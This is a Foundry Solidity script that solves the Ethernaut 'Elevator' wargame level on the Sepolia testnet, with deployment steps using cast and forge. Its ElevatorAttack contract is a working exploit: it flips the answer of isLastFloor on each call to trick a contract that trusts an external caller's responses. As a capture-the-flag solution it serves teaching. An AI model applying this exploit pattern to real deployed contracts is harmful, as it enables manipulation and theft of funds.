// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Elevator.sol";

/*
    Solution script for the Ethernaut Level 11: Elevator

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in ElevatorScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Elevator.s.sol:ElevatorScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Elevator.s.sol/11155111
*/

contract ElevatorAttack {
    bool public isLast = true;

    function isLastFloor(uint256) public returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function attack(address _victim) public {
        Elevator elevator = Elevator(_victim);
        elevator.goTo(10);
    }
}

contract ElevatorScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xDca7f0Df651b0d2800094d7643eA7f52113633e7;
    Elevator level11 = Elevator(instance);

    function run() external {
        vm.startBroadcast();

        // Elevator should not start on the top floor
        require(!level11.top());

        ElevatorAttack attack = new ElevatorAttack();
        attack.attack(address(instance));

        require(level11.top(), 'elevator has not reached the top floor');
    
        vm.stopBroadcast();
    }
}